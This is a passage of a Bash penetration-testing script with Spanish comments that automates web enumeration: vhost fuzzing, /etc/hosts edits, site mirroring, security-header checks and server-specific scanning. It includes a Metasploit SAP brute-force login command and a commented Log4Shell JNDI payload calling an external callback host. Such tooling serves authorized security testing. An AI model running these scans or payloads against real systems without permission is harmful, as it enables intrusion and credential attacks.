			echo -e "\t[+] Fuzz"
			wfuzz -c -w subdominios.txt -H "Host: FUZZ.$DOMINIO" -u $proto_http://$host -t 100 --hw $words --hc 401,400 -f logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_vhosts.txt	2>&1 >/dev/null
			grep 'Ch' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_vhosts.txt | grep -v 'Word' | awk '{print $9}' | tr -d '"' > .enumeracion/"$host"_"$port"_vhosts.txt
			vhosts=`cat .enumeracion/"$host"_"$port"_vhosts.txt`
			vhosts=$(echo $vhosts | sed 's/_/-/g')

			for vhost in $vhosts; do
				echo -e "\t\t[+] Adicionando vhost $vhost a los targets"
				echo "$host $vhost.$DOMINIO" >> /etc/hosts
				echo "$host,$vhost.$DOMINIO,vhost" >> $host_LIST_FILE
			done
		fi	#importarMaltego
	fi
done #host
######################

waitFinish


############ Obteniendo información web DOMINIO
for line in $(cat $TARGETS); do
	host=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	proto_http=`echo $line | cut -f3 -d":"` #http/https


	result=$(formato_ip "$host")	#si es IP
	if [[ $result -eq 1 && $HOSTING == 'n' ]] ; then
		if [ "$VERBOSE" == '1' ]; then  echo "[+] $host es una dirección IP"; fi

		echo -e "\n$OKGREEN[+] ############## IDENTIFICAR DOMINIOS ASOCIADOS AL IP $host:$port $RESET########"
		#Certificado SSL + nmap + webdata
		DOMINIOS_SSL=`cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt 2>/dev/null| tr "'" '"'| jq -r '.subdomains[]' 2>/dev/null | uniq` #Lista un dominio por linea
		DOMINIO_INTERNO_NMAP=`cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_domainNmap.txt 2>/dev/null`
		DOMINIO_INTERNO_WEBDATA=`cat logs/enumeracion/"$host"_web_domainWebData.txt 2>/dev/null`

		if [[  $DOMINIOS_SSL =~ ^[0-9]+$ || $DOMINIOS_SSL == *"_"* || $DOMINIOS_SSL == *"*"* ]] ; then #si contiene solo numeros, el caracter '_' o el caracter * no adicionar
			DOMINIOS_INTERNOS_TODOS="$DOMINIO_INTERNO_NMAP"$'\n'"$DOMINIO_INTERNO_WEBDATA"
		else
			DOMINIOS_INTERNOS_TODOS="$DOMINIOS_SSL"$'\n'"$DOMINIO_INTERNO_NMAP"$'\n'"$DOMINIO_INTERNO_WEBDATA"
		fi

		if [ "$VERBOSE" == '1' ]; then  echo "DOMINIOS_SSL $DOMINIOS_SSL"; fi
		if [ "$VERBOSE" == '1' ]; then  echo "DOMINIO_INTERNO_NMAP $DOMINIO_INTERNO_NMAP"; fi
		if [ "$VERBOSE" == '1' ]; then  echo "DOMINIO_INTERNO_WEBDATA $DOMINIO_INTERNO_WEBDATA"; fi
		if [ "$VERBOSE" == '1' ]; then  echo "DOMINIOS_INTERNOS_TODOS $DOMINIOS_INTERNOS_TODOS"; fi
		for DOMINIO_INTERNO in $DOMINIOS_INTERNOS_TODOS; do
			if [[ ${DOMINIO_INTERNO} == *"enterpriseregistration.windows.net"*  ]];then
				echo "$DOMINIO_INTERNO" >> .enumeracion/"$host"_"$port-$path_web_sin_slash"_azureAD.txt
			else
				echo -e "[+] DOMINIO_INTERNO $DOMINIO_INTERNO"

				grep -q "$DOMINIO_INTERNO" servicios/webApp.txt 2>/dev/null # Verficar si ya identificamos esa app
				greprc=$? # greprc=1 dominio no en lista, greprc=2 webApp.txt no existe

				if [ "$DOMINIO_INTERNO" != NULL ] && [ "$DOMINIO_INTERNO" != "localhost" ] && [ "$DOMINIO_INTERNO" != "" ] && [ "$DOMINIO_INTERNO" != *"*"* ] && ([ "$greprc" -eq 1 ] || [ "$greprc" -eq 2 ]); then

					#Agregar a la lista de targets
					grep -q "$host,$DOMINIO_INTERNO" $IP_LIST_FILE
					greprc=$?
					if [[ $greprc -eq 1  &&  ${DOMINIO_INTERNO} != *"localhost"* &&  ${DOMINIO_INTERNO} != *"127.0.0.1"*  ]];then # si ya agregamos ese dominio
						echo "$host,$DOMINIO_INTERNO,DOMINIO" >> $IP_LIST_FILE
					else
						echo "Ya agregue mas antes $DOMINIO_INTERNO a  $IP_LIST_FILE"
					fi

					#Agregar a /etc/hosts
					grep -q $DOMINIO_INTERNO /etc/hosts
					greprc=$?
					if [[ $greprc -eq 1  &&  ${DOMINIO_INTERNO} != *"localhost"* &&  ${DOMINIO_INTERNO} != *"127.0.0.1"*  ]];then # si ya agregamos ese dominio
						echo "Adicionando $DOMINIO_INTERNO a /etc/hosts"
						echo "$host $DOMINIO_INTERNO" >> /etc/hosts
					else
						echo "Ya agregue mas antes $DOMINIO_INTERNO a /etc/hosts "
					fi
				fi
			fi
		done
	fi # Fin IP format

	echo -e "[+] host ($host)"
	if [[ ${host} != *"localhost"*  && ${host} != *"cpanel."*  && ${host} != *"cpcalendars."* && ${host} != *"cpcontacts."*  && ${host} != *"ftp."* && ${host} != *"webdisk"* && ${host} != *"webmail."* &&  ${host} != *"whm."* && $HOSTING == 'n' ]] ; then
		########## Obteniendo información web DOMINIO ###########
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`
			script_instancias=$((`ps aux | grep webData | wc -l` - 1))
			python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1))
			script_instancias=$((script_instancias + python_instancias))

			if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPTS  ]];then
				if [ "$VERBOSE" == '1' ]; then  echo "SUBNET $SUBNET IP_LIST_FILE=$IP_LIST_FILE"; fi
					lista_hosts=`grep --color=never $host $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`

				if [ "$VERBOSE" == '1' ]; then  echo "lista_hosts1 $lista_hosts"; fi #lista de todos los dominios
				for host in $lista_hosts; do
					if [[  ${host} != *"localhost"*  &&  ${host} != *"cpcalendars."* && ${host} != *"cpcontacts."*  && ${host} != *"webdisk."* ]];then
						egrep -iq "//$host" servicios/webApp.txt 2>/dev/null
						greprc=$?
						if [[ $greprc -eq 0 && -z "$URL" ]];then
							echo -e "\t[+] host $host esta en la lista webApp.txt escaner por separado2 \n"
						else
							#Verificar que no se obtuvo ese dato ya
							if [ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt"  ]; then
								echo -e "\t[+] Obteniendo informacion web (host: $host port:$port)"
								webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webData.txt -maxRedirect 4 > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt  2>/dev/null &
							fi
						fi
					fi
				done

				################################

				break
			else
				script_instancias=`ps aux | grep perl | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E'| wc -l`
				echo -e "\t[-] Maximo número de instancias de perl ($script_instancias) RAM = $free_ram Mb "
				sleep 3
			fi
		done # while true
	fi
done # for web.txt

waitFinish

if [[ "$ESPECIFIC" == "1"  ]];then
	echo -e "\t[+] OWASP Verification Standard Part 1"
	### OWASP Verification Standard Part 1###

	#log image
	curl -k -I $URL > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_responseHeaders.txt

	#CS-08 Cookies
	checkCookie $URL > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-08.txt
	grep 'NO OK' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-08.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-08.txt

	# CS-42 Respuesta HTTP
	checkHeadersServer -url=$URL > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-42.txt
	grep -i 'Vulnerable'  logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-42.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-42.txt

	#CS-44 Servidores
	allow-http -target=$host > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-44.txt
	egrep -iq "vulnerable" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-44.txt
	greprc=$?
	if [[ $greprc -eq 0 ]] ; then
		cp logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-44.txt .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-44.txt
	fi

	# CS-49  Cache-Control
	shcheck.py -d --colours=none --caching --use-get-method $URL  > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-49.txt  2>/dev/null
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-49.txt | egrep 'Cache-Control' | sed 's/Header seguro faltante://g' > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-49.txt

	# CS-51 Header seguros
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-49.txt | egrep 'X-Content-Type-Options' | sed 's/Header seguro faltante://g' > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-51-1.txt
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-49.txt | egrep 'Strict-Transport-Security' | sed 's/Header seguro faltante://g' > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-51-2.txt
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-49.txt | egrep 'Referrer-Policy' | sed 's/Header seguro faltante://g' > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-51-3.txt
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-49.txt | egrep 'X-Frame-Options' | sed 's/Header seguro faltante://g' > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-51-4.txt

	##############
fi


echo -e "$OKGREEN\n[i] Realizando la navegacion forzada $RESET"
for line in $(cat $TARGETS); do
	ip=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	proto_http=`echo $line | cut -f3 -d":"`
	echo -e "\n[+] Escaneando ($proto_http $ip:$port $path_web)"

	if [ "$VERBOSE" == '1' ]; then  echo "IP_LIST_FILE=$IP_LIST_FILE "; fi
	lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`


	if [ -z "$lista_hosts" ] ; then
			lista_hosts=$ip
	else
			lista_hosts=`echo -e "$lista_hosts\n$ip"|uniq`
	fi


	if [ "$VERBOSE" == '1' ]; then  echo -e "LISTA HOST:$lista_hosts" ;fi #lista de todos los dominios + ip
	for host in $lista_hosts; do
		echo -e "\t[+] host actual: $host"

		escanearConURL=0
		egrep -iq "//$host" servicios/webApp.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 && -z "$URL" ]];then
			echo -e "\t[+] host $host esta en la lista webApp.txt escaner por separado3 \n"
			escanearConURL=1 # para que escaneo como URL a parte
		fi

		if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"*  && ${host} != *"cpcalendar"* && ${PROXYCHAINS} != *"s"*  && ${escanearConURL} != 1  ]];then

			#Verificar que no siempre devuelve 200 OK
			msg_error_404=''
			status_code_nonexist1=`getStatus -url $proto_http://${host}:${port}${path_web}nonexisten/45s/`
			only_status_code_nonexist=$status_code_nonexist1
			if [ "$VERBOSE" == '1' ]; then  echo -e "\t[+] status_code_nonexist1: $status_code_nonexist1 "; fi
			if [[  "$status_code_nonexist1" == *":"*  ]]; then # devuelve 200 OK pero se detecto un mensaje de error 404
				msg_error_404=$(echo $status_code_nonexist1 | cut -d ':' -f2)
				msg_error_404="'$msg_error_404'"
				only_status_code_nonexist=`echo $status_code_nonexist1 | cut -d ':' -f1`
			fi

			status_code_nonexist2=`getStatus -url $proto_http://${host}:${port}${path_web}graphql.php`
			if [ "$VERBOSE" == '1' ]; then  echo -e "\t[+] status_code_nonexist2: $status_code_nonexist2 "; fi
			if [[  "$status_code_nonexist2" == *":"*  ]]; then # devuelve 200 OK pero se detecto un mensaje de error 404
				msg_error_404=$(echo $status_code_nonexist2 | cut -d ':' -f2)
				msg_error_404="'$msg_error_404'"
				only_status_code_nonexist=`echo $status_code_nonexist2 | cut -d ':' -f1`
			fi


			if [[ "$only_status_code_nonexist" == '200' &&  -z "$msg_error_404" ]]; then
				echo -n "~Always200-OK" >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
				sed -i ':a;N;$!ba;s/\n//g' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt #borrar salto de linea
			fi

			if [ ! -z "$msg_error_404" ];then
				param_msg_error="-error404 $msg_error_404" #parametro para web-buster
				only_status_code_nonexist=404
				echo "only_status_code_nonexist $only_status_code_nonexist"
			fi

			if [ "$VERBOSE" == '1' ]; then  echo -e "\t[+] $proto_http://${host}:${port}${path_web}nonexisten45s/ status_codes: $status_code_nonexist1 $status_code_nonexist2 "; fi
			if [[ "$only_status_code_nonexist" == "403"  || "$only_status_code_nonexist" == "404"  ||  "$only_status_code_nonexist" == *"303"* ||  "$only_status_code_nonexist" == *"301"* ||  "$only_status_code_nonexist" == *"302"*  ]];then
				if [ "$VERBOSE" == '1' ]; then  echo -e "\t[+] Escaneando $proto_http://$host:$port/"; fi
				webScaneado=1

				if [ -z "$FORCE" ]; then  # no es escaneo de redes por internet
					mkdir -p webTrack/$host 2>/dev/null
					mkdir -p webClone/$host 2>/dev/null
					mkdir -p archivos/$host 2>/dev/null
					touch webTrack/checksumsEscaneados.txt
				fi

				if [[ "$MODE" == "total" &&  ! -z "$URL" ]];then
					echo -e "\t[+] Clonando: $URL"

					if [[ "$ESPECIFIC" == "1" ]];then
						echo "Descargar manualmente el sitio y guardar en webTrack $host"
						read resp
					else
						# si no es CMS descargar con httrack
						egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList"
						greprc=$?
						if [[ $greprc -eq 1 ]]; then
							echo -e "\t\t[+] httrack ($host )"
							rm resultado-httrack.txt 2>/dev/null
							####### httrack ####
							#script --command "httrack $URL  --depth 1  --ext-depth 0 -O webClone/$host" -O resultado-httrack.txt
							script --command "httrack --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36' --mirror --depth=3 --max-rate=0 --sockets=unlimited --robots=0 --stay-on-same-domain '+*.html' '+*.js' '+*.json' '+*.php' '+mime:application/json' '-*.css' '-*.png' '-*.gif' '-*.jpg' '-*.jpeg' '-*.webp' '-*.tmp' '${URL}' -O 'webClone/${host}'" -O resultado-httrack.txt
							find webClone/$host | egrep '\.html|\.js' | while read line
							do
								extractLinks.py "$line" 2>/dev/null| grep "$host" | awk -F"$host/" '{print $2}' >> directorios-personalizado2.txt
							done
							####################
						fi
					fi
				fi	#total && URL

				echo -e "\t[+] Navegacion forzada en host: $proto_http://${host}:${port}${path_web}"
				checkRAM

				if  [ ! -z $DOMINIO ]; then # solo si se escanea con dominio controlar que no se repita los hosts para escaneasr
						#Borrar lineas que cambian en cada peticion
						removeLinks.py logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webData.txt | egrep -vi 'date|token|hidden' > webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html

						if [[ ! -f webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html ]];then
							echo "no disponible" > webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html
						fi

						checksumline=`md5sum webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html`
						md5=`echo $checksumline | awk {'print $1'}`
						egrep -iq $md5 webTrack/checksumsEscaneados.txt
						md5found=$?
						title=`cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | cut -d '~' -f1`

						if [ $md5found -eq 0 ]; then
							noEscaneado=0
						fi

						for webserver_title in "${webservers_defaultTitles[@]}"; do
							if [[ "$title" == *"$webserver_title"* ]]; then
								noEscaneado=1
								break
							fi
						done

						echo $checksumline >> webTrack/checksumsEscaneados.txt

						#mismo host
						if [[ $md5found -eq 0 ]];then
							echo "md5found $md5found webTrack/$host/"$proto_http"-"$host"-"$port"-"$path_web_sin_slash".html"
							echo -n "~sameHOST" >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
							sed -i ':a;N;$!ba;s/\n//g' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt #borrar salto de linea
						fi
				else
					noEscaneado=1 #si no se escanea con domino 
				fi
				

				grep "Dominio identificado" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
				greprc=$? 	# 1= no coincide
				result=$(formato_ip "$host")
				if [[ $result -eq 1 && $greprc -eq 0 ]] ;then
					ip2domainRedirect=1
				else
					ip2domainRedirect=0
				fi

				egrep -qi "500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused|Dominio identificado" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt #verificar si debemos escanear
				hostOK=$?

				egrep -qi "Fortinet|Cisco|RouterOS|Juniper" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
				noFirewall=$?
				# 1= no coincide (no redirecciona a otro dominio o es error de proxy)
				if [ "$VERBOSE" == '1' ]; then  echo -e "\tnoEscaneado $noEscaneado hostOK $hostOK ip2domainRedirect $ip2domainRedirect"; fi

				if [[ $hostOK -eq 1 &&  $noEscaneado -eq 1 && $ip2domainRedirect -eq 0 && $noFirewall -eq 1 ]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio.
					

					if [ -z "$FORCE" ]; then # no es escaneo de redes por internet
						####### wget ##### (usado para control si es un mismo sitio web es el mismo)
						###### fuzz directorios personalizados ###
						echo -e "\t\t[+] directorios personalizado"
						cd webTrack/$host
							wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico,pdf,docx,xls,doc,ppt,pps,pptx,xlsx --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate $proto_http://$host 2>/dev/null
						cd ../../
						find webTrack/$host | egrep '\.html|\.js' | while read line
						do
							extractLinks.py "$line" 2>/dev/null | grep "$host" | awk -F"$host/" '{print $2}' >> webTrack/directorios-personalizado2.txt
						done

						sed -i '/^$/d' webTrack/directorios-personalizado2.txt 2>/dev/null
						sort webTrack/directorios-personalizado2.txt 2>/dev/null | egrep -v 'gif|swf|jquery|jpg' | uniq > webTrack/directorios-personalizado.txt

						if [ -f webTrack/directorios-personalizado.txt ]; then
							checkRAM
							web-buster -target $host -port $port -proto $proto_http -path $path_web -module custom -customDir webTrack/directorios-personalizado.txt -threads $hilos_web -redirects 0 -show404  >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_custom.txt &
							#rm webTrack/directorios-personalizado2.txt 2>/dev/null
						fi
					fi
					####################################

					########### check methods ###
					waitWeb 0.3
					echo -e "\t\t[+] HTTP methods ($proto_http://$host:$port) "
					httpmethods.py -k -L -t 5 $proto_http://$host:$port > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_httpmethods.txt  2>/dev/null &

					gourlex -t $proto_http://$host:$port -uO -s > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_gourlex.txt
					egrep -v '\.png|\.jpg|\.js|css|facebook|nginx|failure|microsoft|github|laravel.com|laravel-news|laracasts.com|linkedin|youtube|instagram|not yet valid|cannot validate certificate|connection reset by peer|EOF|gstatic|twitter|debian|apache|ubuntu|nextcloud|sourceforge|AppServNetwork|mysql|placehold|AppServHosting|phpmyadmin|php.net|oracle.com|java.net|yiiframework|enterprisedb|googletagmanager|envoyer|bunny.net|rockylinux|no such host|gave HTTP|dcm4che|apple|google|amazon.com|turnkeylinux|.org|fb.watch|timeout|unsupported protocol|internic|redhat|fastly|juniper' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_gourlex.txt | sort | uniq > .enumeracion/"$host"_"$port-$path_web_sin_slash"_webLinks.txt

					if [[ "$INTERNET" == "s" ]] && [[ "$MODE" == "total" ]]; then
						echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
						wafw00f $proto_http://$host:$port > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_wafw00f.txt &
					fi

					egrep -i "httpfileserver" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList" # solo el segundo egrep poner "-q"
					greprc=$?
					if [[ $greprc -eq 0  ]];then #
						echo "httpfileserver Vulnerable: https://github.com/Muhammd/ProFTPD-1.3.3a " > .vulnerabilidades/"$host"_"$port"_ProFTPD-RCE.txt
					fi

					enumeracionCMS "$proto_http" $host $port

					if [ $proto_http == "https" ]; then
						testSSL "$proto_http" $host $port
					fi

					###  if the server is apache ######
					egrep -i 'apache|nginx|kong' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList" # solo el segundo egrep poner "-q"
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes
						checkRAM
						enumeracionApache "$proto_http" $host $port
					fi
					####################################

					###  if the server is nginx ######
					egrep -i 'nginx|api-endpoint' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList" 
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es nginx y no se enumero antes
						checkRAM
						enumeracionApi "$proto_http" $host $port
					fi
					

					#######  if the server is SharePoint ######
					grep -i SharePoint logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList"  # no redirecciona
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es SharePoint
						checkRAM
						enumeracionSharePoint "$proto_http" $host $port
					fi
					####################################

					#######  if the server is IIS ######
					grep -i IIS logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList"  # no redirecciona
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes
						checkRAM
						enumeracionIIS "$proto_http" $host $port
					fi
					####################################
					
					#######  if the server is tomcat ######
					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly|Payara" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt| egrep -qiv "302 Found"
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes
						checkRAM
						enumeracionTomcat "$proto_http" $host $port
						#  ${jndi:ldap://z4byndtm.requestrepo.com/z4byndtm}   #log4shell
					fi
					####################################

					#######  if the server is SAP ######
					egrep -i "SAP NetWeaver" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "302 Found"
					greprc=$?
					if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes
						checkRAM
						enumeracionSAP "$proto_http" $host $port
						echo -e "\t\t[+] http-sap-netweaver-leak"
						$proxychains nmap -n -Pn -sT -p $port --script http-sap-netweaver-leak  $host > logs/vulnerabilidades/"$host"_"$port"_sapNetweaverLeak.txt

						echo -e "\t\t[+] Test default passwords"
						$proxychains msfconsole -x "use auxiliary/scanner/sap/sap_soap_rfc_brute_login;set RHOSTS $host;set RPORT $port;exploit;exit" > logs/vulnerabilidades/"$host"_"$port"_passwordDefecto.txt 2>/dev/null &
						#auxiliary/scanner/sap/sap_soap_rfc_read_table
						#set FIELDS MANDT, BNAME, UFLAG, BCODE, PASSCODE, PWDSALTEDHASH
					fi
					####################################


					# if not technology not reconigzed
					egrep -qi "unsafe legacy renegotiation disabled" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt  2>/dev/null
					greprc=$?
					if [[ $greprc -eq 0 ]] ; then
						cp .enumeracion/"$host"_80_webData.txt logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
					fi

					serverType=`cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | cut -d "~" -f2`
					echo -e "\t\t[+] serverType $serverType"
					if [  -z "$serverType" ]; then
						checkRAM
						enumeracionDefecto "$proto_http" $host $port
					fi

					#######  if the server is IoT ######
					enumeracionIOT	$proto_http $host $port

					#echo -e "\t\t[+] cloneSite ($proto_http $host $port) PROXYCHAINS $PROXYCHAINS MODE $MODE"
					######### clone #####
					# if [[ "$PROXYCHAINS" == "n" ]] && [[ "$MODE" == "total" ]]; then
					# 	cloneSite $proto_http $host $port
					# fi
					####################################

					if [[ "$MODE" == "total" ]]; then
						#source resource integrity
						#echo -e "\t[+] source resource integrity check ($proto_http://$host:$port) "
						#sri-check $proto_http://$host:$port  > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sri.txt 2>/dev/null
						#grep -i '<script' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sri.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sri.txt 2>/dev/null

						# _blank targets with no "rel nofollow no referrer"
						#echo -e "\t[+] _blank targets check ($proto_http://$host:$port)  "
						#check_blank_target $proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_check-blank-target.txt
						#grep -iv error logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_check-blank-target.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_check-blank-target.txt
						checkRAM
						egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList"
						greprc=$?
						if [[  "$EXTRATEST" == "oscp" && $greprc -eq 1 && "$ESPECIFIC" == "1" ]]; then
							##########################################
							checkRAM
							echo -e "\t[+] Crawling ($proto_http://$host:$port )"
							echo -e "\t\t[+] katana"
							katana -u $proto_http://$host:$port -no-scope -no-color -silent -output logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawledKatana.txt >/dev/null 2>/dev/null
							echo -e "\t\t[+] blackwidow"

							blackwidow -u $proto_http://$host:$port > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawledBlackwidow.txt
							head -30 logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawledBlackwidow.txt > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-01.txt
							grep 'Telephone' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawledBlackwidow.txt | sort | uniq > .enumeracion/"$host"_"$port-$path_web_sin_slash"_telephones.txt
							grep -i 'sub-domain' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawledBlackwidow.txt | sort | uniq | awk {'print $4'} | httprobe.py > .enumeracion/"$host"_web_app2.txt
							cat .enumeracion/"$host"_web_app2.txt servicios/webApp.txt 2>/dev/null | delete-duplicate-urls.py  > servicios/webApp2.txt
							mv servicios/webApp2.txt servicios/webApp.txt 2>/dev/null

							sort logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawledKatana.txt |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g"  | uniq > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawled.txt
							grep Dynamic logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawledBlackwidow.txt |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" | awk {'print $5'} | uniq > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawled.txt
							grep -v Dynamic logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawledBlackwidow.txt |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" | uniq >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawled.txt

							grep $DOMINIO logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawled.txt | egrep -v 'google|youtube' | sort | uniq > .enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawled.txt
							grep -iv $DOMINIO logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webCrawled.txt | egrep -v 'google|youtube' | sort | uniq  > .enumeracion/"$host"_"$port-$path_web_sin_slash"_websRelated.txt
							echo ""

							grep --color=never "\?" .enumeracion/*_webCrawled.txt | sort | uniq >> logs/enumeracion/parametrosGET2.txt
							grep "$host" logs/enumeracion/parametrosGET2.txt | egrep -iv '\.css|\.js|\.eot|\.svg|\.ttf|\.woff2' |sort | uniq | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  >> logs/enumeracion/"$host"_parametrosGET_uniq.txt


							##### Eliminar URL repetidas que solo varian en los parametros
							current_uri=""
							while IFS= read -r url
							do
								uri=`echo $url | cut -f1 -d"?"`
								param=`echo $line | cut -f2 -d"?"`

								if [ "$current_uri" != "$uri" ];
								then
									echo  "$url" >> logs/enumeracion/"$host"_parametrosGET_uniq_final.txt
									current_uri=$uri
								fi
							done < logs/enumeracion/"$host"_parametrosGET_uniq.txt

							########### XSS / SQLi ####
							i=1
